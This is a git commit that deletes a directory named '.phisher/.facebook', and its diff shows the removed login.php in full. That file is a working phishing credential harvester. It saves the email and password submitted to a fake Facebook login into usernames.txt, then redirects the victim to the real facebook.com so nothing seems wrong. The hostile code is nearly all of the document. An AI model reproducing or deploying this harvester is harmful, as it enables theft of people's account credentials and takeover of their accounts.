8efd607a295220060489f272b1949ff69f38300a
mike90s15 <82988362+mike90s15@users.noreply.github.com>
2023-01-28 08:35:04 -0700

    Delete .phisher/.facebook directory

--- .phisher/.facebook/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "\e[1;34m Conta: \e[0;32m" . $_POST['email'] . "\e[1;34m\n Senha: \e[0;32m" . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/');
-exit();
